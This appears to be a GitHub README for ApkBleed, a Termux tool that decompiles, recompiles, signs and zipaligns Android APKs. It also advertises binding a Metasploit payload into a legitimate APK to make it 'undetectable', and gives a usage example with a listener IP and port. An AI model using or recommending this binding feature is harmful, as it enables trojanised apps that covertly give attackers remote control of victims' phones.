<h1 align="center"> ApkBleed </h1>
<h3 align="center"> Command Line APK Reverse Enginering Tool</h3>
<h4 align="center"> Designed For Termux. Made With <3 <3 </h4>


# ApkBleed

ApkBleed Is An Advance APK Reverse Enginering Tool Made For Specialy Made For Termux.

Because Few Months Ago Termux Officialy Removed OpenJDK8 JRE From Their Repo.

So Tools Like Tmux-Bunch([@Hax4Us](https://github.com/Hax4Us)) Stoped Working. Many Time Hax4Us Tried To Fix Tmux-Bunch. But Can't Make It Happend.

Then [@Remo7777](http://github.com/remo7777) Came Up With An Idea Of PROOT And Created Bind-Apk. But It Consume Too Much Of Storage. After Installing It Becomes 1.8GB-2.0GB.

So I Came Up With And Idea Of Alpine Linux. It Is Small In Size. But There Was An Problem Of AAPT(Android Asset Packaging Tool)

Because AAPT Wasn't Available For Alpine. So I Reached To Hax4Us To Compile AAPT For Alpine.

After 2-3 Days He Added AAPT Source With His Tool New ApkMod

ApkMod Is A Great Tool. But Don't Have Many Options.So I Created ApkBleed.

You Can Say That ApkBleed Is Inspired By ApkMod


# Why Is It Called ApkBleed

<b>APK</b> - Stands For Android Packages

<b>Bleed</b> - Added Bleed Just To Make It Cool


# Table Of Contents

1.[Version](http://github.com/ng1nX4O4/ApkBleed#version)
2.[Overview](http://github.com/ng1nX4O4/ApkBleed#overview)
3.[Setup](http://github.com/ng1nX4O4/ApkBleed#setup)
4.[Usage](http://github.com/ng1nX4O4/ApkBleed#overview)
5.[Contact](http://github.com/ng1nX4O4/ApkBleed#contact)
6.[Credit](http://github.com/ng1nX4O4/ApkBleed#credit)


# Version

ApkBleed  :    1.1

Aurthor   :    Rabby Sheikh


# Overview

*Decompile Source Of An APk With Decoded AndroidManifest.xml File Using Apktool Installed In Alpine PROOT.
*Recompile An Apk Source Code With Apktool And AAPT Installed In Alpine PROOT.
*Sign An Apk Using SignApk Built In Alpine PROOT.
*ZipAlign An Apk For Better Optimization Using ZipAlign
*Most Imported Binding With Metasploit Framwork. It Binds MSF Payload With An Original Apk And Make It Undectable.
*This Tool Only Work With My Java Repo You Can Find It [Here](http://github.com/ng1nX4O4/termux-java)


# Setup

[*]Note: This Tool Is Only For Termux User And Support ARM,AARCH64 And X64_86 Architecture. More Support Coming Soon

```
git clone http://github.com/ng1nx4O4/ApkBleed
cd ApkBleed
```


# Usage

<h4>Decompile</h4>

```
apkbleed -d <path-of-apk> <path-of-output>
```

<h4>Recompile</h4>

```
apkbleed -r <path-of-folder> <path-of-output-apk>
```

<h4>SignApk</h4>

```
apkbleed -s <path-of-apk> <path-of-output-apk>
```

<h4>ZipAlign</h4>

```
apkbleed -z <path-of-apk> <path-of-output-apk>
```

<h4>Binding</h4>

```
apkbleed -b <host-ip> <port> <path-of-apk> <path-of-output-apk>
```

Example: apkbleed -b 127.0.0.1 4444 /sdcard/test.apk /sdcard/payload.apk


# Contact

If You Wanna Contact Me Then Here Is Some Details

	Facebook  :   [@ng1nX4O4](https://www.facebook.com/ng1nX4O4)
	Email     :   nullsqu4d.ng1nx4o4@gmail.com



# Credit

1.[AAPT](https://github.com/Hax4us/Apkmod/tree/master/aapt): [@Hax4Us](https://github.com/Hax4us/)
2.PROOT-APKTOOL: [@remo7777](https://github.com/remo7777)
3.ApkTool: @iBotPeaches
